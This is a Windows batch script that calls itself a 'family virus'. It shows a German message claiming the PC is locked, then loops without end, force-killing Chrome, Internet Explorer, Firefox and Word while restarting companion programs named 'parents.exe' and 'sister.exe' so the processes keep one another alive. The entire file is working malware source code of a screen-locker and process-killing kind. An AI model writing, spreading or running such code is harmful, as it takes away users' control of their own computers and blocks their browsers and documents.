@echo off
title SS-Brother
color a
set control=0
set par=5
:review
set /a control=%control%+1
cd "C:\users\%username%\system\"
cls
echo *************** Brother ***************
echo.
echo - FAMILY VIRUS ACTIV
echo Dieser PC wurde gesperrt!
echo Bestimmte Anwendungen werden blockiert. 
echo.
if "%control%"=="0" start "cmd.exe" "parents.exe" >nul
if "%control%"=="%par%" taskkill /f /im parents.exe /t&set par=%par%+5&start "cmd.exe" "parents.exe" >nul
:over
tasklist 2>nul | find /I /N "sister.exe"2>nul
if "%ERRORLEVEL%"=="1" start "cmd.exe" "parents.exe" >nul
tasklist 2>nul | find /I /N "sister.exe"2>nul
if "%ERRORLEVEL%"=="1" start "cmd.exe" "sister.exe" >nul
tasklist 2>nul | find /I /N "chrome.exe"2>nul
if "%ERRORLEVEL%"=="0" taskkill /f /im chrome.exe /t >nul
tasklist 2>nul | find /I /N "parents.exe"2>nul
if "%ERRORLEVEL%"=="1" start "cmd.exe" "parents.exe" >nul
tasklist 2>nul | find /I /N "iexplore.exe"2>nul
if "%ERRORLEVEL%"=="0" taskkill /f /im iexplore.exe /t >nul
tasklist 2>nul | find /I /N "firefox.exe"2>nul
if "%ERRORLEVEL%"=="0" taskkill /f /im firefox.exe /t >nul
tasklist 2>nul | find /I /N "sister.exe"2>nul
if "%ERRORLEVEL%"=="1" start "cmd.exe" "sister.exe" >nul
tasklist 2>nul | find /I /N "winword.exe"2>nul
if "%ERRORLEVEL%"=="0" taskkill /f /im winword.exe /t >nul
REM CMD.exe nicht beenden, auch nicht als EXE Datei
goto review
